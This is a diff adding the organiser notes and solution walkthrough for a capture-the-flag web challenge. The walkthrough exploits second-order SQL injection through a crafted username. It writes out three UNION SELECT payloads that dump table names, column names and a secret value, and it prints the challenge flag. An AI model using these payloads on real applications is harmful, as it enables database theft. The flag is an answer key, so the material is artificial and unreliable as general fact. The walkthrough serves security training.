@@ -1,0 +1,19 @@
+# Movie Reviews
+
+Difficulty: Medium/Hard
+Topics: Web
+
+Setup:
+  - Use the `docker-compose.prod.yml` to spin the containers
+  - Give the players the `app/app.py` source code
+
+Walkthrough:
+ - Go through the code, notice that on the Dashboard, the code to load the user's reviews is vulnerable to SQL Injection
+ - Register a new user whose username is the SQL Injection code
+ - Use a UNION-based injection with 8 values (to match the existing query) to dump the database tables and find the table 'secrets'
+  - ```') UNION SELECT table_name, null, null, null, null, null, null, null FROM information_schema.tables; -- -```
+ - List all of the columns of the table 'secrets' to find 'secret_value'
+  - ```') UNION SELECT column_name, null, null, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'secrets'; -- -```
+ - Extract the secret_value from the table to get the flag
+  - ```') UNION SELECT secret_value, null, null, null, null, null, null, null FROM secrets; -- -```
+- The flag is ```dalctf{n3v3r_g0_4g41n57_4_51c1l14n_wh3n_d34th_15_0n_7h3_l1n3_84729}```
